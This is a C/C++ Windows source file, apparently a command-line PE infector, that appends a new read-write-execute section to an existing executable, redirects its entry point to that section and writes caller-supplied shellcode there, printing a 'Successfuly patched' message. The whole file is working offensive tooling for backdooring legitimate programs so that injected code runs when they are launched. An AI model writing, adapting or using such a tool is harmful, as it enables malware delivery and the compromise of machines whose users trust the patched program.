#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
 
DWORD align(DWORD size, DWORD align, DWORD addr) {
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}
 
bool AddSection(char *filepath, char *sectionName, DWORD sizeOfSection) {
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    DWORD fileSize = GetFileSize(file, NULL);
    //so we know how much buffer to allocate
    BYTE *pByte = new BYTE[fileSize];
    DWORD dw;
    //lets read the entire file,so we can use the PE information
    ReadFile(file, pByte, fileSize, &dw, NULL); 
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)  return false; //invalid PE
    PIMAGE_FILE_HEADER FH = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER OH = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER));
    PIMAGE_SECTION_HEADER SH = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 
    ZeroMemory(&SH[FH->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&SH[FH->NumberOfSections].Name, sectionName, 8); 
    //We use 8 bytes for section name,cause it is the maximum allowed section name size
 
    //lets insert all the required information about our new PE section
    SH[FH->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH->SectionAlignment, 0);
    SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
    SH[FH->NumberOfSections].SizeOfRawData = align(sizeOfSection, OH->FileAlignment, 0);
    SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
    SH[FH->NumberOfSections].Characteristics = 0xE00000E0;
    /*
        0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                     IMAGE_SCN_CNT_CODE  |
                     IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                     IMAGE_SCN_MEM_EXECUTE |
                     IMAGE_SCN_CNT_INITIALIZED_DATA |
                     IMAGE_SCN_MEM_READ 
    */
    SetFilePointer(file, SH[FH->NumberOfSections].PointerToRawData + SH[FH->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
    //end the file right here,on the last section + it's own size
    SetEndOfFile(file);
    //now lets change the size of the image,to correspond to our modifications
    //by adding a new section,the image size is bigger now
    OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
    // set the entry pointer to the new virtual address
    OH->AddressOfEntryPoint = SH[FH->NumberOfSections].VirtualAddress;
    //and we added a new section,so we change the NOS too
    FH->NumberOfSections += 1;
    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    //and finaly,we add all the modifications to the file
    WriteFile(file, pByte, fileSize, &dw, NULL);
    CloseHandle(file);
    return true;
}
 
bool AddCode(char *filepath, unsigned char *shellcode, int shellcode_len) {
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return false;
    DWORD filesize = GetFileSize(file, NULL);
    BYTE *pByte = new BYTE[filesize];
    DWORD dw;
    ReadFile(file, pByte, filesize, &dw, NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew); 
    //since we added a new section,it must be the last section added so we must get to the last section to insert our secret data :)
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1); 
    SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(file, shellcode, shellcode_len, &dw, 0);
    CloseHandle(file);
    return TRUE;
}
 
int main( int argc, char *argv[] ) {
    char *file, *section;
    file = argv[1];
    section = argv[2];    
    int size;
    size = atoi(argv[3]);

    /* get the payload */
    char *hexstring;
    hexstring = argv[4];
    char *pos = hexstring;
    int pl = strlen(hexstring);
    unsigned char val[pl/2];
    size_t count = 0;
    for(count = 0; count < sizeof(val)/sizeof(val[0]); count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2 * sizeof(char);
    }    
    for(count = 0; count < sizeof(val)/sizeof(val[0]); count++) printf("\\x%02x", val[count]);            
    int pl3 = pl/2;
    
    if (AddSection(file, section, size)){
        if (AddCode(file, val, pl3)) {
            printf("[info] %s Successfuly patched!\n", file);
        } else {
            printf("[erro] Error adding shellcode\n");
        }
    } else {
        printf("[erro] Error adding Section\n");
    }

}
